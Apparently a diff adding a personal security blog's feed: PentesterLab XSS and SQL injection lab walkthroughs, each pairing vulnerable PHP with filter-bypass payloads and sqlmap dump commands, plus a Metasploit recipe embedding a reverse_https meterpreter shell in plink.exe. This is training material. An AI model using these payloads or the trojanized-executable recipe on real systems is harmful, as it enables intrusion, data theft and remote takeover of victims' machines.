+<figure class='code'><figcaption><span>example4.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/script/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'>
+</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">    </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer tris to completely filter <code>script</code>. I can use <code>img</code> to bypass it.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example4.php?name=&lt;img src="xx" onerror="alert('xss')"/&gt;</code></p>
+
+<h3>Example5</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example5.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/alert/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">(</span><span class="s2">&quot;error&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'>
+</span><span class='line'><span class="x">Hello </span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">    </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The devekoper filter <code>alert</code>. I can use <code>fromCharCode</code> to build alert payload.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</code></p>
+
+<h3>Example 6</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example6.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">Hello </span>
+</span><span class='line'><span class="x">&lt;script&gt;</span>
+</span><span class='line'><span class="x">  var $a= &quot;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;;</span>
+</span><span class='line'><span class="x">&lt;/script&gt;</span>
+</span><span class='line'><span class="x">  </span><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The input name variable is between <code>&lt;script&gt;</code>, so we can just close the double quote and use <code>\\</code> to comment the reset of code.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example6.php?name=";alert("xss");//
+</code></p>
+
+<h3>Example 7</h3>
+
+<p>code review</p>
+
+<figure class='code'><figcaption><span>example7.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">Hello </span>
+</span><span class='line'><span class="x">&lt;script&gt;</span>
+</span><span class='line'><span class="x">  var $a= &#39;</span><span class="cp">&lt;?php</span>  <span class="k">echo</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&#39;;</span>
+</span><span class='line'><span class="x">&lt;/script&gt;</span>
+</span><span class='line'><span class="x">  </span>
+</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer uses <code>htmlentities()</code> to encode special characters. However, it does not encode single quotes <code>'</code>, so that I can use single quote to close it and comment the rest of the code</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example7.php?name=';alert('xss');//</code></p>
+
+<h3>Example 8</h3>
+
+<p>code review</p>
+
+<figure class='code'><figcaption><span>example8.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="s2">&quot;HELLO &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot; method=&quot;POST&quot;&gt;</span>
+</span><span class='line'><span class="x">  Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;</span>
+</span><span class='line'><span class="x">  &lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer does not valid the parpmeter <code>PHP_SELF</code> so that I can bypass it.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example8.php/" onmouseover="alert('xss')</code></p>
+
+<h3>Example 9</h3>
+
+<p>code review</p>
+
+<figure class='code'><figcaption><span>example9.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;script&gt;</span>
+</span><span class='line'><span class="x">  document.write(location.hash.substring(1));</span>
+</span><span class='line'><span class="x">&lt;/script&gt;</span>
+</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The user input is after <code>#</code>. This is a DOM-based XSS vuln.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Metasploit Generates Payload]]></title>
+    <link href="http://wg135.github.io/blog/2016/02/26/metasploit-generates-payload/"/>
+    <updated>2016-02-26T15:47:27-06:00</updated>
+    <id>http://wg135.github.io/blog/2016/02/26/metasploit-generates-payload</id>
+    <content type="html"><![CDATA[<h3>This note is for generating payload using Metasploit.</h3>
+
+<h3>Use <code>generate</code> command:</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use payload/windows/meterpreter/reverse_https
+</span><span class='line'>
+</span><span class='line'>msf payload(reverse_https) &gt; set lhost 192.168.79.156
+</span><span class='line'>
+</span><span class='line'>msf payload(reverse_https) &gt; set lport 4444
+</span><span class='line'>
+</span><span class='line'>msf payload(reverse_https) &gt; generate -t exe -f false.exe -x /var/www/html/plink.exe
+</span></code></pre></td></tr></table></div></figure>
+
+
+<!--more-->
+
+
+<p>Here I use reverse_https to generate payload and inject to plink.exe as a template.</p>
+
+<p>options:</p>
+
+<p><code>-t  ------ payload format</code></p>
+
+<p><code>-f  ------ payload output</code></p>
+
+<p><code>-x  ------ injection template</code></p>
+
+<p>This step will generate reverse https payload and use plink.exe as a template, write to file false.exe and send it to the target.</p>
+
+<p>In order to get the reverse https shell, I have to set up multi handler:</p>
+
+<h3>Set up <code>multi handler</code></h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/multi/handler 
+</span><span class='line'>
+</span><span class='line'>msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
+</span><span class='line'>
+</span><span class='line'>msf exploit(handler) &gt; set lhost 192.168.79.156
+</span><span class='line'>
+</span><span class='line'>msf exploit(handler) &gt; set lport 4444
+</span><span class='line'>
+</span><span class='line'>msf exploit(handler) &gt; exploit </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once the victim run the false.exe on the target machine, it will initlize a reverse https connection to the attacker.</p>
+
+<p><img src="http://wg135.github.io/images/blog/metasplot_payload/metasploit_payload_1.JPG" title="[title text [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - SQL Injection]]></title>
+    <link href="http://wg135.github.io/blog/2016/02/20/pentesterlab-web-for-pentester-sql-injection/"/>
+    <updated>2016-02-20T16:14:10-06:00</updated>
+    <id>http://wg135.github.io/blog/2016/02/20/pentesterlab-web-for-pentester-sql-injection</id>
+    <content type="html"><![CDATA[<p>Web for Pentester:
+    This exercise is a set of the most common web vulnerability</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>   
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a vulnerability due to no input validation on parameter $_GET[“name”], so I can hack it directly by injecting <code>' or  1=1 #</code>. After injection, $sql now is <code>SELECT * FROM users where name=''  or  1=1 #</code>. This sql injection will pull all items in the table users.</p>
+
+<p>Manually exploit (encode root' or 1=1#):</p>
+
+<p><code>http://192.168.79.162/sqli/example1.php?name=root%27%20or%201%3D1%23</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql1_manual.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>sqlmap exploit:</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example1.php?name=root"  --dump</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql1_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" ></p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/ /&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR NO SPACE&quot;</span><span class="p">);</span>   
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The author filtered the space in the user input. It prevents us from using the  <code>'  or  1=1  #</code>. However, this filtering is easily bypassed, using tabulation (HT or \t) or comment /**/</p>
+
+<p>Manually exploit (encode &lsquo;/**/or/**/1=1/**/#):</p>
+
+<p><code>http://192.168.79.162/sqli/example2.php?name=root%27%2f%2a%2a%2for%2f%2a%2a%2f1%3D1%2f%2a%2a%2f%23</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql2_manual.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>sqlmap exploit:</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example2.php?name=root" --dump --tamper=space2comment</code></p>
+
+<p>space2comment.py &mdash; Replaces space character (&lsquo; &rsquo;) with comments &lsquo;/**/&rsquo;</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql2_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" ></p>
+
+<h3>Example 3</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/\s+/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR NO SPACE&quot;</span><span class="p">);</span>   
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where name=&#39;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>    <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The author filtered the spaces and tabulations in the user input. It prevents us from using the  <code>'  or  1=1  #</code>. However, this filtering is easily bypassed, using comment /**/</p>
+
+<p>Manually exploit (encode &lsquo;/**/or/**/1=1/**/#):</p>
+
+<p><code>http://192.168.79.162/sqli/example3.php?name=root%27%2f%2a%2a%2for%2f%2a%2a%2f1%3D1%2f%2a%2a%2f%23</code></p>
+
